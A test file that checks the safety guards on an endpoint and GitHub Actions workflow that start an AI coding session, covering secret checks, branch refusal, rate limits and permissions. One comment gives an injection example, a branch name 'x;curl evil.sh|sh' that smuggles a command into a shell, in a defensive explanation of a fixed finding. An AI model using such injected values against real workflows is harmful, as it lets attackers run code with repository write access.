import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';

/**
 * **The guards on the one thing in this project that can act.**
 *
 * Phase 2 slice three. Everything else the site serves is read-only by
 * construction; `/api/instruct` starts a real session on the owner's
 * instruction. These assertions are source-level because neither the function
 * nor the workflow can be executed here — the container's egress policy blocks
 * GitHub and no credential exists in this environment, by design. A check that
 * reads the source is weaker than one that runs it, and it is what there is; it
 * is recorded as the weaker thing rather than dressed as the stronger one.
 */

const FUNCTION = readFileSync(
  new URL('../../../netlify/functions/instruct.mjs', import.meta.url),
  'utf8',
);
const WORKFLOW = readFileSync(
  new URL('../../../.github/workflows/instruct.yml', import.meta.url),
  'utf8',
);
const NETLIFY = readFileSync(new URL('../../../netlify.toml', import.meta.url), 'utf8');

describe('the endpoint that can start work', () => {
  it('takes a POST and refuses anything else', () => {
    expect(FUNCTION).toContain("request.method !== 'POST'");
  });

  it('refuses when no secret is installed, rather than defaulting to open', () => {
    expect(FUNCTION).toContain('if (!secret) return refuse(');
    expect(FUNCTION).toContain('if (!token) return refuse(');
  });

  it('requires the shared secret on every request', () => {
    expect(FUNCTION).toContain("request.headers.get('x-virgil-secret')");
    expect(FUNCTION).toContain('secretMatches');
  });

  it('compares the secret without leaking its length through an early return', () => {
    // The comparison walks the whole string once the lengths match, rather than
    // stopping at the first difference.
    expect(FUNCTION).toContain('difference |= given.charCodeAt(i) ^ expected.charCodeAt(i);');
  });

  it('refuses the default branch, by name and by asking GitHub which it is', () => {
    expect(FUNCTION).toContain('repository.default_branch');
    expect(FUNCTION).toContain("branch === 'main'");
    expect(FUNCTION).toContain("branch === 'master'");
  });

  it('runs one at a time', () => {
    expect(FUNCTION).toContain("run.status === 'queued' || run.status === 'in_progress'");
  });

  it('has a ceiling on runs in a day', () => {
    expect(FUNCTION).toMatch(/const MAX_PER_DAY = \d+;/);
    expect(FUNCTION).toContain('today >= MAX_PER_DAY');
  });

  it('bounds the length of an instruction', () => {
    expect(FUNCTION).toMatch(/const MAX_INSTRUCTION = \d+;/);
  });

  it('asks GitHub for nothing it does not need, and asks for no merge', () => {
    for (const forbidden of ['/merge', 'pulls', 'deployments', 'delete']) {
      expect(FUNCTION.includes(forbidden), forbidden).toBe(false);
    }
  });

  it('is routed on its own, above the catch-all', () => {
    expect(NETLIFY).toContain('from = "/api/instruct"');
    expect(NETLIFY.indexOf('from = "/api/instruct"')).toBeLessThan(NETLIFY.indexOf('from = "/*"'));
  });
});

/**
 * **The two findings that were about what an input can reach — KP2-06 and
 * KP2-07.**
 *
 * Both were open across three Keeper reviews, and both are the same species:
 * a value that arrives from outside is treated as trustworthy at the one point
 * where it stops being data and becomes instruction. One was the branch name
 * reaching a shell; the other was a limit that switched itself off when it
 * could not be checked.
 */
describe('nothing an input carries reaches a command', () => {
  /** Every `run:` block in the workflow, with the line numbers they start at. */
  const runBlocks = (): { at: number; body: string }[] => {
    const lines = WORKFLOW.split('\n');
    const out: { at: number; body: string }[] = [];
    let indent = -1;
    let body: string[] = [];
    let at = 0;
    for (const [index, line] of lines.entries()) {
      const opens = /^(\s*)run: \|/.exec(line);
      if (opens) {
        if (indent >= 0) out.push({ at, body: body.join('\n') });
        indent = (opens[1] ?? '').length;
        body = [];
        at = index + 1;
        continue;
      }
      if (indent < 0) continue;
      const isOutdent = line.trim() !== '' && line.length - line.trimStart().length <= indent;
      if (isOutdent) {
        out.push({ at, body: body.join('\n') });
        indent = -1;
        body = [];
        continue;
      }
      body.push(line);
    }
    if (indent >= 0) out.push({ at, body: body.join('\n') });
    return out;
  };

  it('has run blocks to check, so this is not passing over an empty list', () => {
    expect(runBlocks().length).toBeGreaterThan(4);
  });

  /**
   * **KP2-06.** `${{ inputs.branch }}` was pasted into three `git push` lines
   * and into the middle of a `node -e` string literal. A branch named
   * `x;curl evil.sh|sh` ran a command; one containing a quote closed the JSON
   * string and wrote its own script, which this workflow then executed holding a
   * token that can write to the repository.
   *
   * The rule is not "sanitise the branch". It is that **no expansion happens in
   * a command at all**: every value arrives through `env:`, where the runner
   * puts it in the environment instead of pasting it into the text of a script.
   */
  it('expands no workflow expression inside any run block', () => {
    for (const block of runBlocks()) {
      expect(
        block.body,
        `an expression is expanded in the run block at line ${block.at}`,
      ).not.toContain('${{');
    }
  });

  it('passes the branch through the environment, quoted, wherever it pushes', () => {
    expect(WORKFLOW).not.toMatch(/git push origin HEAD:\$\{\{/);
    const pushes = [...WORKFLOW.matchAll(/git push origin (\S+)/g)].map((m) => m[1] ?? '');
    expect(pushes.length).toBeGreaterThan(2);
    for (const target of pushes) expect(target).toBe('"HEAD:$TARGET"');
  });

  /**
   * The gate that makes the environment variable safe to use even where a shell
   * would still expand it. An allow-list: what a branch name needs, and no other
   * byte. The deny-list it replaced named three shapes and let every other one
   * through, which is the way a deny-list always fails — on the character nobody
   * listed.
   */
  it('admits only branch names it can name the shape of', () => {
    expect(WORKFLOW).toContain("grep -qE '^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$'");
    expect(WORKFLOW).toContain('exit 1');
    // And still refuses the default branch first, before this or anything else.
    const refusal = WORKFLOW.indexOf('Refuse the default branch');
    const checkout = WORKFLOW.indexOf('actions/checkout');
    expect(refusal).toBeGreaterThan(-1);
    expect(refusal).toBeLessThan(checkout);
  });

  /**
   * **KP2-07.** The runs query answered both limits — one at a time, and the
   * daily ceiling — and fell to an empty list when it failed. So a GitHub error
   * or an expired token did not weaken the limits, it removed them, and the
   * endpoint looked exactly as it does when nothing has run yet.
   */
  it('refuses to start work when it cannot read what is already running', () => {
    expect(FUNCTION).not.toMatch(/workflow_runs\?per_page=100`,\s*token,\s*\)\.catch/);
    expect(FUNCTION).toContain("throw new Error('the runs query returned no list of runs')");
    // The refusal, and the status that says "try again" rather than "you are
    // out of runs" — they are different instructions to the owner.
    expect(FUNCTION).toContain('so nothing was started');
    expect(FUNCTION).toContain('503');
  });

  it('counts both limits from the list it refused to do without', () => {
    // The guard is only worth having if the limits are still downstream of it.
    const guard = FUNCTION.indexOf('a limit that cannot be counted has not been met');
    const inFlight = FUNCTION.indexOf("'A session is already working. One at a time.'");
    const ceiling = FUNCTION.indexOf('which is the ceiling');
    expect(guard).toBeGreaterThan(-1);
    expect(inFlight).toBeGreaterThan(guard);
    expect(ceiling).toBeGreaterThan(guard);
  });
});

describe('the workflow that does the work', () => {
  it('starts only when the owner starts it', () => {
    expect(WORKFLOW).toContain('workflow_dispatch:');
    // No path by which it starts itself.
    for (const trigger of ['schedule:', 'push:', 'pull_request:', 'workflow_run:']) {
      expect(WORKFLOW.includes(trigger), trigger).toBe(false);
    }
  });

  it('refuses the default branch before anything is checked out', () => {
    const refusal = WORKFLOW.indexOf('Refuse the default branch');
    const checkout = WORKFLOW.indexOf('actions/checkout');
    expect(refusal).toBeGreaterThan(-1);
    expect(refusal).toBeLessThan(checkout);
    expect(WORKFLOW).toContain('github.event.repository.default_branch');
  });

  it('is granted contents and nothing else', () => {
    const block = WORKFLOW.slice(WORKFLOW.indexOf('permissions:'));
    expect(block).toContain('contents: write');
    for (const extra of ['pull-requests:', 'id-token:', 'actions: write', 'packages:']) {
      expect(block.includes(extra), extra).toBe(false);
    }
  });

  it('writes the instruction down before acting on it', () => {
    const record = WORKFLOW.indexOf('Record the instruction');
    const act = WORKFLOW.indexOf('Work on the instruction');
    expect(record).toBeGreaterThan(-1);
    expect(record).toBeLessThan(act);
  });

  it('tells the room a session started before the work, and stopped after it', () => {
    expect(WORKFLOW).toContain('Say that a session has started');
    expect(WORKFLOW).toContain('Say that the session has stopped');
    // Whatever happened, including a failure: a run that ends leaving a
    // Fabricator lit is the failure the shelf life exists for.
    const stopped = WORKFLOW.slice(WORKFLOW.indexOf('Say that the session has stopped'));
    expect(stopped).toContain('if: always()');
  });

  it('prefers the subscription token, which carries no per-run charge', () => {
    expect(WORKFLOW).toContain('CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}');
    expect(WORKFLOW).toContain('if [ -n "$CLAUDE_CODE_OAUTH_TOKEN" ]; then');
    // And it says which one it used, because one of them costs money per run
    // and the owner should never have to guess which he is spending.
    expect(WORKFLOW).toContain('No per-run charge');
    expect(WORKFLOW).toContain('This run is charged');
  });

  it('stops rather than pretending when no credential is installed', () => {
    expect(WORKFLOW).toContain('no credential is installed, so no agent can run');
    expect(WORKFLOW).toContain(
      'the instruction is recorded and committed; nothing else has happened',
    );
  });

  it('never merges, deploys or opens a pull request', () => {
    // **Comments are stripped first, and that is not a loophole.** Half this
    // workflow's prose is about what it refuses to do, and a scan that banned
    // the words would fail on the sentences promising not to use them — which
    // would teach the next person to delete the explanation rather than the
    // capability. What is scanned is what runs.
    const runs = WORKFLOW.split('\n')
      .filter((line) => !line.trim().startsWith('#'))
      .join('\n')
      .toLowerCase();
    for (const forbidden of ['gh pr ', 'pull_request', 'git merge', 'deploy']) {
      expect(runs.includes(forbidden), forbidden).toBe(false);
    }
  });
});
